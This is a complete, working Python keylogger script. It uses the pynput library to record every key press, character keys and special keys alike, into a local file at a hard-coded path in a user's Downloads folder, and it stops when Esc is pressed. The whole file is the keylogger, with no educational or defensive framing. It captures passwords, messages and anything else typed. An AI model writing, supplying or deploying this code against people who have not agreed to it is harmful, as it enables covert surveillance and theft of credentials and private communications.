import pynput.keyboard

# Define the path to the log file
log_file = "/home/baymax/Downloads/keystrokes.log"

# Function to write keystrokes to the log file
def write_to_log(key):
    key = str(key)
    # If the key is a character, write it to the log file
    if len(key) == 3:
        with open(log_file, "a") as f:
            f.write(key[1])
    # If the key is a special key (e.g., enter, space), write its name
    else:
        with open(log_file, "a") as f:
            f.write(f"[{key}]\n")

# Function to handle key presses
def on_press(key):
    write_to_log(key)

# Function to handle key releases
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop the keylogger
        return False

# Start the keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()